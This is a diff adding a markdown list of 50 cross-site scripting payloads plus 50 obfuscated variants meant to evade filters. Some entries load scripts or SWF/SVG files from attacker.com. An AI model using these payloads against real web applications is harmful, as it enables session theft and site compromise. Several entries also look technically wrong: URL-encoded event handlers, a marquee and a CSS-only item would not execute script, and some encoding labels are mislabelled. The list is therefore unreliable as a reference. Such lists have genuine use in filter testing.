@@ -1,0 +1,105 @@
+## XSS Payloads (Original)
+
+1.  `<script>alert("XSS")</script>`
+2.  `<img src=x onerror=alert("XSS")>`
+3.  `<svg onload=alert("XSS")>`
+4.  `<body onload=alert("XSS")>`
+5.  `<input type="image" src="x" onerror="alert('XSS')">`
+6.  `<a href="javascript:alert('XSS')">Click Me</a>`
+7.  `<iframe src="javascript:alert('XSS')"></iframe>`
+8.  `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>`
+9.  `<video><source onerror="alert('XSS')"></video>`
+10. `<marquee behavior="alternate">alert("XSS")</marquee>`
+11. `<style>body {background-image: url("javascript:alert('XSS')");}</style>`
+12. `<plaintext style="display:block">alert("XSS")`
+13. `<textarea autofocus onfocus="alert('XSS')"></textarea>`
+14. `<details ontoggle="alert('XSS')"></details>`
+15. `<select onchange="alert('XSS')"><option>Test</option></select>`
+16. `<button onclick="alert('XSS')">Click</button>`
+17. `<form><input type="text" onfocus="alert('XSS')" autofocus></form>`
+18. `<isindex onmouseover="alert('XSS')">`
+19. `<xss style="xss:expression(alert('XSS'))">`
+20. `<applet code="xss.class"></applet>` (requires xss.class)
+21. `<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">`
+22. `<b onmouseover=alert('XSS')>Click</b>`
+23. `<div onmouseover=alert('XSS')>Hover</div>`
+24. `<img src="x" onmousemove="alert('XSS')">`
+25. `<table background="javascript:alert('XSS')"></table>`
+26. `<layer src="javascript:alert('XSS')"></layer>` (Netscape only)
+27. `<comment><script>alert("XSS")</script></comment>`
+28. `<!--<script>alert("XSS")</script>-->`
+29. `';alert('XSS')//`
+30. `");alert('XSS')//`
+31. `</script><script>alert("XSS");</script>`
+32. `<script type="text/javascript">alert("XSS");</script>`
+33. `<script>window.onload = function(){alert("XSS")}</script>`
+34. `<img src="x" onerror="javascript:alert('XSS')">`
+35. `<iframe onload="alert('XSS')"></iframe>`
+36. `<input type="text" value="XSS" onfocus="alert('XSS')" />`
+37. `<div style="width:expression(alert('XSS'));"></div>`
+38. `<div style="font-family:'foo[;color:red;font-size:100px;];'">Text</div>`
+39. `<input type="search" results=10 onsearch="alert('XSS')">`
+40. `<object type="text/x-scriptlet" data="http://attacker.com/xss.html"></object>`
+41. `<embed allowscriptaccess="always" src="http://attacker.com/xss.swf"></embed>`
+42. `<body onunload="alert('XSS')">`
+43. `<div contenteditable onblur="alert('XSS')">Edit Me</div>`
+44. `<svg><animate attributeName="attributeName" from="alert(1)" to="alert(2)" /></svg>`
+45. `<math><mrow><mi><a xlink:href="javascript:alert('XSS')">click</a></mi></mrow></math>`
+46. `<frameset onload="alert('XSS')"></frameset>`
+47. `<keygen autofocus onkeyup="alert('XSS')">`
+48. `<object data="http://attacker.com/xss.svg" type="image/svg+xml"></object>`
+49. `<import namespace="xss"><xss:template match="/">alert('XSS')</xss:template></import>` (IE only)
+50. `<div onpointerover="alert('XSS')">Hover</div>`
+
+## XSS Payloads (Obfuscated)
+
+1.  `<scr<script>ipt>alert("XSS")</scr<script>ipt>` (String Splitting)
+2.  `<img src=x onerror=aler\u0074("XSS")>` (Unicode Encoding)
+3.  `<svg onload=%61%6c%65%72%74("XSS")>` (URL Encoding)
+4.  `<body onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))> (CharCode)
+5.  `<input type="image" src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">` (HTML Entity Encoding)
+6.  `<a href="j&#x61;v&#x61;script:alert('XSS')">Click Me</a>` (Hex Encoding)
+7.  `<iframe src="jav\u0061script:alert('XSS')"></iframe>` (Unicode Encoding)
+8.  `<object data="data:text/html;base64,PHNj&#x72;aXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0Pg=="></object>` (Hex Encoding + Base64)
+9.  `<video><source onerror=ale\u0072t("XSS")></video>` (Unicode Encoding)
+10. `<marquee behavior="alternate">al&#101;rt("XSS")</marquee>` (HTML Entity Encoding)
+11. `<style>body {background-image: url("jav&#x61;script:alert('XSS')");}</style>` (Hex Encoding)
+12. `<plaintext style="display:block">al\u0065rt("XSS")` (Unicode Encoding)
+13. `<textarea autofocus onfocus=aler\u0074("XSS")></textarea>` (Unicode Encoding)
+14. `<details ontoggle=%61%6c%65%72%74("XSS")></details>` (URL Encoding)
+15. `<select onchange=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))><option>Test</option></select>` (CharCode)
+16. `<button onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click</button>` (HTML Entity Encoding)
+17. `<form><input type="text" onfocus=aler\u0074("XSS") autofocus></form>` (Unicode Encoding)
+18. `<isindex onmouseover=%61%6c%65%72%74("XSS")>` (URL Encoding)
+19. `<xss style="xss:expression(aler\u0074('XSS'))">` (Unicode Encoding)
+20. `<applet code="xss.class"></applet>` (Requires xss.class - N/A for effective obfuscation)
+21. `<embed src="data:text/html;base64,PHNjcmlwdD5hbGV&#x72;0KCdYU1MnKTwvc2NyaXB0Pg==">` (Hex Encoding + Base64)
+22. `<b onmouseover=aler\u0074('XSS')>Click</b>` (Unicode Encoding)
+23. `<div onmouseover=%61%6c%65%72%74('XSS')>Hover</div>` (URL Encoding)
+24. `<img src="x" onmousemove=aler\u0074('XSS')>` (Unicode Encoding)
+25. `<table background="jav&#x61;script:alert('XSS')"></table>` (Hex Encoding)
+26. `<layer src="jav\u0061script:alert('XSS')"></layer>` (Unicode Encoding)
+27. `<comment><scr<script>ipt>alert("XSS")</scr<script>ipt></comment>` (String Splitting)
+28. `<!--<scr<script>ipt>alert("XSS")</scr<script>ipt>-->` (String Splitting)
+29. `';aler\u0074('XSS')//` (Unicode Encoding)
+30. `");ale\u0072t('XSS')//` (Unicode Encoding)
+31. `</script><scr<script>ipt>alert("XSS");</scr<script>ipt>` (String Splitting)
+32. `<scr<script>ipt type="text/javascript">alert("XSS");</scr<script>ipt>` (String Splitting)
+33. `<script>window.onload = function(){ale\u0072t("XSS")}</script>` (Unicode Encoding)
+34. `<img src="x" onerror="javascript:aler\u0074('XSS')">` (Unicode Encoding)
+35. `<iframe onload=aler\u0074('XSS')></iframe>` (Unicode Encoding)
+36. `<input type="text" value="XSS" onfocus=ale\u0072t('XSS') />` (Unicode Encoding)
+37. `<div style="width:expression(aler\u0074('XSS'));"></div>` (Unicode Encoding)
+38. `<div style="font-family:'foo[;color:red;font-size:100px;];'">Text</div>` (Payload kept the same as it relies on CSS interpretation)
+39. `<input type="search" results=10 onsearch=aler\u0074('XSS')>` (Unicode Encoding)
+40. `<object type="text/x-scriptlet" data="http://attacker.com/xss.html"></object>` (External resource - N/A for obfuscation of core payload)
+41. `<embed allowscriptaccess="always" src="http://attacker.com/xss.swf"></embed>` (External resource - N/A for obfuscation of core payload)
+42. `<body onunload=aler\u0074('XSS')>` (Unicode Encoding)
+43. `<div contenteditable onblur=aler\u0074('XSS')>Edit Me</div>` (Unicode Encoding)
+44. `<svg><animate attributeName="attributeName" from="ale&#x72;t(1)" to="alert(2)" /></svg>` (Hex Encoding)
+45. `<math><mrow><mi><a xlink:href="jav&#x61;script:alert('XSS')">click</a></mi></mrow></math>` (Hex Encoding)
+46. `<frameset onload=%61%6c%65%72%74("XSS")></frameset>` (URL Encoding)
+47. `<keygen autofocus onkeyup=aler\u0074('XSS')>` (Unicode Encoding)
+48. `<object data="http://attacker.com/xss.svg" type="image/svg+xml"></object>` (External resource - N/A for obfuscation of core payload)
+49. `<import namespace="xss"><xss:template match="/">ale&#x72;t('XSS')</xss:template></import>` (Hex Encoding)
+50. `<div onpointerover=%61%6c%65%72%74('XSS')>Hover</div>` (URL Encoding)
